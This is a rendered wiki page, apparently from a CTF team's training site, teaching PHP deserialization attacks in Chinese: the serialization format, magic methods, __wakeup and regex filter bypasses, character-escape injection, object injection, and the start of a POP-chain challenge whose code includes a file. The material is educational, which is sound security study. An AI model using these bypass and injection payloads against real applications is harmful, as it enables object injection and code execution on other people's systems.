    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="简介" class="md-nav__link">
    简介
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="常见的序列化格式" class="md-nav__link">
    常见的序列化格式
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="案例引入" class="md-nav__link">
    案例引入
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="反序列化中常见的魔术方法" class="md-nav__link">
    反序列化中常见的魔术方法
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#trick" title="反序列化绕过小Trick" class="md-nav__link">
    反序列化绕过小Trick
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php71" title="php7.1+反序列化对类属性不敏感" class="md-nav__link">
    php7.1+反序列化对类属性不敏感
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#__wakeupcve-2016-7124" title="绕过__wakeup(CVE-2016-7124)" class="md-nav__link">
    绕过__wakeup(CVE-2016-7124)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" title="绕过部分正则" class="md-nav__link">
    绕过部分正则
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" title="利用引用" class="md-nav__link">
    利用引用
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#16" title="16进制绕过字符的过滤" class="md-nav__link">
    16进制绕过字符的过滤
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php_1" title="PHP反序列化字符逃逸" class="md-nav__link">
    PHP反序列化字符逃逸
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1" title="情况1：过滤后字符变多" class="md-nav__link">
    情况1：过滤后字符变多
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2" title="情况2：过滤后字符变少" class="md-nav__link">
    情况2：过滤后字符变少
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" title="对象注入" class="md-nav__link">
    对象注入
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pop" title="POP链的构造利用" class="md-nav__link">
    POP链的构造利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pop_1" title="POP链简单介绍" class="md-nav__link">
    POP链简单介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" title="简单案例讲解" class="md-nav__link">
    简单案例讲解
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php_2" title="PHP原生类反序列化利用" class="md-nav__link">
    PHP原生类反序列化利用
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#soapclient" title="SoapClient介绍" class="md-nav__link">
    SoapClient介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" title="利用方式" class="md-nav__link">
    利用方式
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="实战" class="md-nav__link">
    实战
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phar" title="Phar反序列化" class="md-nav__link">
    Phar反序列化
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#phar_1" title="什么是phar文件" class="md-nav__link">
    什么是phar文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phar_2" title="phar文件的结构" class="md-nav__link">
    phar文件的结构
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="漏洞利用条件" class="md-nav__link">
    漏洞利用条件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="受影响的函数" class="md-nav__link">
    受影响的函数
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="绕过方式" class="md-nav__link">
    绕过方式
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-session" title="php-session反序列化" class="md-nav__link">
    php-session反序列化
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#session" title="session简单介绍" class="md-nav__link">
    session简单介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#session_1" title="session 的存储机制" class="md-nav__link">
    session 的存储机制
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phpinisession" title="php.ini中一些session配置" class="md-nav__link">
    php.ini中一些session配置
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" title="利用姿势" class="md-nav__link">
    利用姿势
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sessionupload_progress" title="session.upload_progress进行文件包含和反序列化渗透" class="md-nav__link">
    session.upload_progress进行文件包含和反序列化渗透
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#session_2" title="使用不同的引擎来处理session文件" class="md-nav__link">
    使用不同的引擎来处理session文件
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_session" title="$_SESSION变量直接可控" class="md-nav__link">
    $_SESSION变量直接可控
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_session_1" title="$_SESSION变量直接不可控" class="md-nav__link">
    $_SESSION变量直接不可控
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/scu-ctf/scu-ctf.github.io/edit/master/docs/CTFWiki/Web/Unserialize/php反序列化.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="php">PHP反序列化<a class="headerlink" href="#php" title="Permanent link">&para;</a></h1>
<h2 id="_1">简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<p>在网上找到一个比较形象的例子</p>
<blockquote>
<p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p>
</blockquote>
<p>php 将数据序列化和反序列化会用到两个函数 </p>
<p><strong>serialize</strong> 将对象格式化成有序的字符串 </p>
<p><strong>unserialize</strong> 将字符串还原成原来的对象</p>
<p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p>
<h2 id="_2">常见的序列化格式<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>了解即可</p>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串</li>
</ul>
<h2 id="_3">案例引入<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>简单的例子(以数组为例子)</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;xiao&#39;</span><span class="p">,</span><span class="s1">&#39;shi&#39;</span><span class="p">,</span><span class="s1">&#39;zi&#39;</span><span class="p">);</span>
<span class="nv">$user</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$user</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">);</span>
<span class="nb">print_r</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</pre></div>

<p>他会输出</p>
<div class="codehilite"><pre><span></span><span class="x">a:3:{i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;}</span>
<span class="x">Array</span>
<span class="x">(</span>
<span class="x">    [0] =&gt; xiao</span>
<span class="x">    [1] =&gt; shi</span>
<span class="x">    [2] =&gt; zi</span>
<span class="x">)</span>
</pre></div>

<p>我们对上面这个例子做个简单讲解，方便大家入门</p>
<div class="codehilite"><pre><span></span><span class="x">a:3:{i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;}</span>
<span class="x">a:array代表是数组，后面的3说明有三个属性</span>
<span class="x">i:代表是整型数据int，后面的0是数组下标</span>
<span class="x">s:代表是字符串，后面的4是因为xiao长度为4</span>

<span class="x">依次类推</span>
</pre></div>

<p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p>
<div class="codehilite"><pre><span></span>&lt;?php
class test{
    public $a;
    public $b;
    function __construct(){$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;}
    function happy(){return $this-&gt;a;}
}
$a = new test();
echo serialize($a);
?&gt;
</pre></div>

<p>输出(O代表Object是对象的意思，也是类)</p>
<div class="codehilite"><pre><span></span>O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;}
</pre></div>

<p>而如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">protected</span>  <span class="nv">$a</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s2">&quot;xiaoshizi&quot;</span><span class="p">;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">=</span><span class="s2">&quot;laoshizi&quot;</span><span class="p">;}</span>
    <span class="k">function</span> <span class="nf">happy</span><span class="p">(){</span><span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>输出则会导致不可见字符<code>\x00</code>的丢失</p>
<div class="codehilite"><pre><span></span><span class="x">O:4:&quot;test&quot;:2:{s:4:&quot; * a&quot;;s:9:&quot;xiaoshizi&quot;;s:7:&quot; test b&quot;;s:8:&quot;laoshizi&quot;;}</span>
</pre></div>

<h2 id="_4">反序列化中常见的魔术方法<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="x">__wakeup() //执行unserialize()时，先会调用这个函数</span>
<span class="x">__sleep() //执行serialize()时，先会调用这个函数</span>
<span class="x">__destruct() //对象被销毁时触发</span>
<span class="x">__call() //在对象上下文中调用不可访问的方法时触发</span>
<span class="x">__callStatic() //在静态上下文中调用不可访问的方法时触发</span>
<span class="x">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span>
<span class="x">__set() //用于将数据写入不可访问的属性</span>
<span class="x">__isset() //在不可访问的属性上调用isset()或empty()触发</span>
<span class="x">__unset() //在不可访问的属性上使用unset()时触发</span>
<span class="x">__toString() //把类当作字符串使用时触发</span>
<span class="x">__invoke() //当尝试将对象调用为函数时触发</span>
</pre></div>

<h2 id="trick">反序列化绕过小Trick<a class="headerlink" href="#trick" title="Permanent link">&para;</a></h2>
<h3 id="php71">php7.1+反序列化对类属性不敏感<a class="headerlink" href="#php71" title="Permanent link">&para;</a></h3>
<p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p>
<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p>
<div class="codehilite"><pre><span></span>&lt;?php
class test{
    protected $a;
    public function __construct(){
        $this-&gt;a = &#39;abc&#39;;
    }
    public function  __destruct(){
        echo $this-&gt;a;
    }
}
unserialize(&#39;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;);
</pre></div>

<h3 id="__wakeupcve-2016-7124">绕过__wakeup(CVE-2016-7124)<a class="headerlink" href="#__wakeupcve-2016-7124" title="Permanent link">&para;</a></h3>
<blockquote>
<p>版本：</p>
<p>​ PHP5 &lt; 5.6.25</p>
<p>​ PHP7 &lt; 7.0.10</p>
</blockquote>
<p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p>
<p>对于下面这样一个自定义类</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="s1">&#39;666&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span>  <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>如果执行<code>unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');</code>输出结果为<code>666</code></p>
<p>而把对象属性个数的值增大执行<code>unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');</code>输出结果为abc</p>
<h3 id="_5">绕过部分正则<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p><code>preg_match('/^O:\d+/')</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p>
<ul>
<li>利用加号绕过（注意在url里传参时+要编码为%2B）</li>
<li>serialize(array(<span><span class="MathJax_Preview">a));//</span><script type="math/tex">a));//</script></span>a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li>
</ul>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span>  <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">match</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^O:\d+/&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">)){</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;you lose!&#39;</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;</span><span class="p">;</span>
<span class="c1">// +号绕过</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;O:4&#39;</span><span class="p">,</span><span class="s1">&#39;O:+4&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nx">match</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
<span class="c1">// serialize(array($a));</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="s1">&#39;a:1:{i:0;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}}&#39;</span><span class="p">);</span>
</pre></div>

<h3 id="_6">利用引用<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span>  <span class="fm">__destruct</span><span class="p">(){</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">===</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">){</span>
            <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">test</span><span class="p">());</span>
</pre></div>

<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p>
<h3 id="16">16进制绕过字符的过滤<a class="headerlink" href="#16" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">O:4:&quot;test&quot;:2:{s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;}</span>
<span class="x">可以写成</span>
<span class="x">O:4:&quot;test&quot;:2:{S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;}</span>
<span class="x">表示字符类型的s大写时，会被当成16进制解析。</span>
</pre></div>

<p>我这里写了一个例子</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span>  <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;你绕不过！！&quot;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// 未作处理前</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;}&#39;</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="c1">// 做处理后 \75是u的16进制</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;}&#39;</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</pre></div>

<h3 id="php_1">PHP反序列化字符逃逸<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h3>
<h4 id="1">情况1：过滤后字符变多<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
<p>首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个</p>
<div class="codehilite"><pre><span></span>&lt;?php
function change($str){
    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);
}
$name = $_GET[&#39;name&#39;];
$age = &quot;I am 11&quot;;
$arr = array($name,$age);
echo &quot;反序列化字符串：&quot;;
var_dump(serialize($arr));
echo &quot;&lt;br/&gt;&quot;;
echo &quot;过滤后:&quot;;
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;
</pre></div>

<p>正常情况,传入<code>name=mao</code></p>
<p><img alt="" src="1.png" /></p>
<p>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p>
<p><img alt="" src="2.png" /></p>
<p>首先来看看结果，再来讲解</p>
<p><img alt="" src="3.png" /></p>
<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}</code>
<code>";i:1;s:6:"woaini";}</code>这一部分一共二十个字符
由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>";i:1;s:6:"woaini";}</code>，从而造成<code>";i:1;s:6:"woaini";}</code>的溢出，而<code>"</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code>
最后的<code>;}</code>闭合反序列化全过程导致原来的<code>";i:1;s:7:"I am 11";}"</code>被舍弃，不影响反序列化过程`</p>
<h4 id="2">情况2：过滤后字符变少<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
<p>老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">change</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;xx&quot;</span><span class="p">,</span><span class="s2">&quot;x&quot;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;反序列化字符串：&quot;</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
<span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;过滤后:&quot;</span><span class="p">;</span>
<span class="nv">$old</span> <span class="o">=</span> <span class="nx">change</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$old</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
<span class="nv">$new</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$old</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$new</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;此时，age=&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$new</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
</pre></div>

<p>正常情况传入<code>name=mao&amp;age=11</code>的结果</p>
<p><img alt="" src="4.png" /></p>
<p>老规矩看看最后构造的结果，再继续讲解</p>
<p><img alt="" src="5.png" /></p>
<p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；
我们来看，这部分是age序列化后的结果</p>
<p><code>s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"</code></p>
<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>";s:3:"age";s:28:"11</code>这一部分刚好20个，后面由于有<code>"</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p>
<h2 id="_7">对象注入<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
<p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p>
<p><strong>对象漏洞</strong>出现得满足两个前提</p>
<blockquote>
<p>1、<code>unserialize</code>的参数可控。
2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p>
</blockquote>
<p>比如这个例子</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
    <span class="k">var</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&quot;y4mao&quot;</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;}&#39;</span><span class="p">;</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</pre></div>

<p>在脚本运行结束后便会调用<code>_destruct</code>函数，同时会覆盖test变量输出<code>maomi</code></p>
<h2 id="pop">POP链的构造利用<a class="headerlink" href="#pop" title="Permanent link">&para;</a></h2>
<h3 id="pop_1">POP链简单介绍<a class="headerlink" href="#pop_1" title="Permanent link">&para;</a></h3>
<p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
<h3 id="_8">简单案例讲解<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>首先看看简单的MRCTF2020-Ezpop,不带大家一一读代码了，自己解决</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

